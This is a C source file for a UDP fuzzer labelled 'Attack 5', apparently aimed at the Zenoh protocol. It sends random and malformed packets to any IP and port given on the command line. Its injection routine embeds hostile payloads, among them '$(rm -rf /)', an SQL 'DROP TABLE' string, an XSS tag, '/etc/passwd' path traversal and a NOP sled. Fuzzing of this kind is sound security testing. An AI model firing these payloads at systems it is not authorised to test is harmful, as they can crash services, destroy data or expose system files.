/*
 * Attack 5: Protocol Fuzzer
 * Sends randomized/mutated protocol messages to find bugs
 * 
 * Compile: gcc -o attack5_fuzzer attack_5_protocol_fuzzer.c -pthread
 * Run: ./attack5_fuzzer <target_ip> <target_port> <iterations>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096

static volatile int g_running = 1;

typedef enum {
    FUZZ_RANDOM,
    FUZZ_VALID_HEADER,
    FUZZ_MALFORMED,
    FUZZ_OVERFLOW,
    FUZZ_UNDERFLOW,
    FUZZ_INJECTION
} fuzz_strategy_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping fuzzer...\n");
    g_running = 0;
}

void fuzz_random(unsigned char *buf, size_t *len) {
    *len = (rand() % MAX_PACKET_SIZE) + 1;
    for (size_t i = 0; i < *len; i++) {
        buf[i] = rand() % 256;
    }
}

void fuzz_valid_header(unsigned char *buf, size_t *len) {
    const unsigned char msg_types[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    buf[0] = msg_types[rand() % 7] | (rand() % 4) << 5;
    
    *len = 1 + (rand() % 1024);
    for (size_t i = 1; i < *len; i++) {
        buf[i] = rand() % 256;
    }
}

void fuzz_overflow(unsigned char *buf, size_t *len) {
    buf[0] = 0x00; // FRAME
    buf[1] = 0xFF; buf[2] = 0xFF; buf[3] = 0xFF; buf[4] = 0xFF; // Huge seq
    *len = MAX_PACKET_SIZE;
    memset(buf + 5, 0xAA, *len - 5);
}

void fuzz_underflow(unsigned char *buf, size_t *len) {
    buf[0] = rand() % 7;
    *len = 1; // Minimal message
}

void fuzz_injection(unsigned char *buf, size_t *len) {
    const char *payloads[] = {
        "'; DROP TABLE sessions; --",
        "$(rm -rf /)",
        "<script>alert('XSS')</script>",
        "\x00\x00\x00\x00\x00\x00\x00\x00",
        "%s%s%s%s%s%s%s%s",
        "../../../../etc/passwd",
        "\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    };
    
    buf[0] = 0x00; // FRAME
    buf[1] = 0x01; // Seq = 1
    
    const char *payload = payloads[rand() % 7];
    size_t payload_len = strlen(payload);
    memcpy(buf + 2, payload, payload_len);
    *len = 2 + payload_len;
}

const char* strategy_name(fuzz_strategy_t strategy) {
    switch (strategy) {
        case FUZZ_RANDOM: return "Random";
        case FUZZ_VALID_HEADER: return "Valid Header";
        case FUZZ_MALFORMED: return "Malformed";
        case FUZZ_OVERFLOW: return "Overflow";
        case FUZZ_UNDERFLOW: return "Underflow";
        case FUZZ_INJECTION: return "Injection";
        default: return "Unknown";
    }
}

void fuzz_test(int sock, struct sockaddr_in *target, fuzz_strategy_t strategy,
               unsigned long *total, unsigned long *crashes) {
    unsigned char buffer[MAX_PACKET_SIZE];
    size_t len;
    
    switch (strategy) {
        case FUZZ_RANDOM: fuzz_random(buffer, &len); break;
        case FUZZ_VALID_HEADER: fuzz_valid_header(buffer, &len); break;
        case FUZZ_OVERFLOW: fuzz_overflow(buffer, &len); break;
        case FUZZ_UNDERFLOW: fuzz_underflow(buffer, &len); break;
        case FUZZ_INJECTION: fuzz_injection(buffer, &len); break;
        default: fuzz_random(buffer, &len);
    }
    
    ssize_t sent = sendto(sock, buffer, len, 0,
                         (struct sockaddr*)target, sizeof(*target));
    
    if (sent > 0) {
        (*total)++;
        
        // Try to receive response
        fd_set readfds;
        struct timeval tv = {0, 100000}; // 100ms timeout
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        
        if (select(sock + 1, &readfds, NULL, NULL, &tv) > 0) {
            unsigned char response[MAX_PACKET_SIZE];
            ssize_t recv_len = recvfrom(sock, response, sizeof(response), 0, NULL, NULL);
            
            // Analyze response
            if (recv_len == 0) {
                printf("[!] Empty response - possible crash?\n");
                (*crashes)++;
            } else if (recv_len > 0 && (response[0] & 0x1F) == 0x06) {
                printf("[!] Connection closed by peer\n");
            }
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <iterations>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 1000\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    unsigned long iterations = atol(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Protocol Fuzzer                    ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Iterations: %lu\n", iterations);
    printf("[*] Strategies: 6\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return 1;
    }
    
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    printf("[+] Fuzzer started\n\n");
    
    unsigned long total = 0;
    unsigned long crashes = 0;
    time_t start = time(NULL);
    
    for (unsigned long i = 0; i < iterations && g_running; i++) {
        fuzz_strategy_t strategy = rand() % 6;
        fuzz_test(sock, &target_addr, strategy, &total, &crashes);
        
        if ((i + 1) % 100 == 0) {
            printf("[*] Progress: %lu/%lu | Strategy: %-15s | Crashes: %lu\n",
                   i + 1, iterations, strategy_name(strategy), crashes);
        }
        
        usleep(1000);
    }
    
    close(sock);
    
    time_t duration = time(NULL) - start;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Fuzzing Results                   ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Tests:     %-25lu ║\n", total);
    printf("║ Potential Crashes: %-23lu ║\n", crashes);
    printf("║ Duration:        %-25ld ║\n", duration);
    if (duration > 0) {
        printf("║ Tests/sec:       %-25.2f ║\n", (double)total / duration);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}